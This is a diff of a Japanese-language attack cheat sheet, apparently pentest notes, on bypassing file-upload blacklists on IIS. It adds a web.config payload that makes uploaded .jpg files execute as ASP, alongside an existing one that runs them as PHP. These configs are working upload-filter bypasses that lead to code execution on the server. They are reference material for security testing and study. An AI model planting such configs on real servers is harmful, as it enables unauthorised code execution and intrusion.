@@ -304,13 +304,14 @@ The file avatars/.htaccess has been uploaded
 ### IIS + web.config による攻撃手法
 
 - `web.config`ファイルでディレクトリごとにグローバル設定を上書きした固有の設定が可能
-- PHPがブラックリストでアップロードできない場合、任意の拡張子をPHPとして実行する設定を`web.config`に記述してアップロード
+- PHPがブラックリストでアップロードできない場合、任意の拡張子をPHP/ASPとして実行する設定を`web.config`に記述してアップロード
+
+PHPの場合
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
     <system.webServer>
         <handlers>
-            <!-- .jpg拡張子をPHPとして実行 -->
             <add name="PHP_jpg" 
                  path="*.jpg" 
                  verb="*" 
@@ -319,6 +320,20 @@ The file avatars/.htaccess has been uploaded
                  resourceType="Unspecified" />
         </handlers>
     </system.webServer>
+</configuration>
+```
+
+ASPの場合
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+  <system.webServer>
+    <handlers>
+      <add name="cmd" path="*.jpg" verb="*" modules="IsapiModule"
+           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
+           resourceType="File"/>
+    </handlers>
+  </system.webServer>
 </configuration>
 ```
 
